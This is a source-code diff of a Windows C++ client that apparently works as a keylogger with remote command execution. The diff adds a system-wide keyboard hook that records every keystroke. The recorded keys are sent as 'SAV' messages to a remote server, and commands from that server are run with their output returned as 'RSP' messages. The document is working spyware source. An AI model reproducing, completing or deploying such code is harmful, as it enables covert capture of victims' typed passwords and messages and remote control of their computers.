@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-13 17:53:04
+* @Last Modified time: 2017-04-13 19:54:04
 */
 
 #include <vector>
@@ -31,6 +31,7 @@ using namespace std;
     #include <arpa/inet.h>
     #include <sys/socket.h>
     #include <gdiplus.h>
+    #include <unistd.h>
 
     using namespace Gdiplus;
 
@@ -70,54 +71,20 @@ using namespace std;
 
 static bool terminated = false;
 static bool logged_in = false;
+static bool command_ack = false;
 
-/* concerned special keycodes */
-char keycodes[] =
+static int llkeycode;
+
+static HHOOK llkeyboardHook;
+
+pthread_mutex_t mutex_socket;
+
+struct cmd_args
 {
-    VK_LBUTTON,
-    VK_RBUTTON,
-    VK_MBUTTON,
-    VK_BACK,
-    VK_TAB,
-    VK_RETURN,
-    VK_SHIFT,
-    VK_CONTROL,
-    VK_MENU,
-    VK_CAPITAL,
-    VK_ESCAPE,
-    VK_SPACE,
-    VK_PRIOR,
-    VK_PRIOR,
-    VK_HOME,
-    VK_LEFT,
-    VK_UP,
-    VK_RIGHT,
-    VK_DOWN,
-    VK_SNAPSHOT,
-    VK_INSERT,
-    VK_DELETE,
-
-    VK_NUMPAD0,
-    VK_NUMPAD1,
-    VK_NUMPAD2,
-    VK_NUMPAD3,
-    VK_NUMPAD4,
-    VK_NUMPAD5,
-    VK_NUMPAD6,
-    VK_NUMPAD7,
-    VK_NUMPAD8,
-    VK_NUMPAD9,
-
-    VK_MULTIPLY,
-    VK_ADD,
-    VK_SEPARATOR,
-    VK_SUBTRACT,
-    VK_DECIMAL,
-    VK_DIVIDE
+    int socket;
+    string cmd;
 };
 
-bool command_ack = false;
-pthread_mutex_t mutex_socket;
 int send_request(int socket, const char *buffer, int size, bool applylock)
 {
     int status = 0, wait = 10;
@@ -139,15 +106,42 @@ int send_request(int socket, const char *buffer, int size, bool applylock)
     return status;
 }
 
+LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wparam, LPARAM lparam)
+{
+    KBDLLHOOKSTRUCT *hook = (KBDLLHOOKSTRUCT*)lparam;
+
+    int flag = wparam == WM_KEYUP;
+    llkeycode = hook->vkCode | (flag << 31);
+    return CallNextHookEx(llkeyboardHook, code, wparam, lparam);
+}
+
+void *keyboard_hook_handler(void *args)
+{
+    MSG msg;
+    HINSTANCE app = GetModuleHandle(NULL);
+
+    llkeyboardHook = SetWindowsHookEx(WH_KEYBOARD, LowLevelKeyboardProc, app, 0);
+    while(GetMessage(&msg, NULL, 0, 0) > 0)
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(llkeyboardHook);
+}
+
 void *logger(void *args)
 {
-    int i, index = 3, socket;
     vector<char> buf(100);
+    int i, index = 3, socket;
+
+    pthread_t hook_thread;
 
     DPRINT("%s()\n", __func__);
 
     socket = *(int*)args;
     sprintf(buf.data(), "SAV");
+    pthread_create(&hook_thread, NULL, &keyboard_hook_handler, NULL);
+
     while(true)
     {
         // maximum of 3 entries can be made in a single loop so 1020
@@ -162,25 +156,10 @@ void *logger(void *args)
             index = 3;
         }
 
-        for (int i = 0; i < sizeof(keycodes); i++)
+        if (llkeycode)
         {
-            /* get special key's status */
-            if (GetAsyncKeyState(keycodes[i]))
-                buf[index++] = i;
-        }
-
-        for (int i = 0x41; i < 0x5B; i++)
-        {
-            /* get alphabets */
-            if (GetAsyncKeyState(i))
-                buf[index++] = i;
-        }
-
-        for (int i = 0x30; i < 0x3A; i++)
-        {
-            /* get numeric keys */
-            if (GetAsyncKeyState(i))
-                buf[index++] = i;
+            buf[index++] = llkeycode;
+            llkeycode = 0;
         }
 
         sleep(100);
@@ -222,12 +201,6 @@ void register_device(int socket, string recv_uid)
     write(socket, uid.c_str(), uid.size());
 }
 
-struct cmd_args
-{
-    int socket;
-    string cmd;
-};
-
 void *execute_cmd(void* arguments)
 {
     int len;
@@ -249,15 +222,12 @@ void *execute_cmd(void* arguments)
         return NULL;
     }
 
-    /* we want this data to be contigous */
-
     string str;
     while(fgets(buf.data(), 128, pPipe))
     {
         str = buf.data();
         len = (int)str.size() + 10;
         sprintf(buf.data(), "RSP%07d%s", len, str.c_str());
-        // send request failed
         if (!send_request(args->socket, buf.data(), len, true)) break;
     }
 
@@ -373,7 +343,7 @@ int run(const char* remote_addr, int port)
 {
     int sock, len;
     string cmd, req;
-    vector<char> buffer(1030);
+    vector<char> buffer(1030), keybuff(100);
     struct sockaddr_in addr;
     struct cmd_args cmdargs;
     fd_set active_fd_set, read_fd_set;
@@ -521,6 +491,8 @@ int run(const char* remote_addr, int port)
         }
     }
 
+    close(sock);
+    UnhookWindowsHookEx(llkeyboardHook);
     return 0;
 }
 
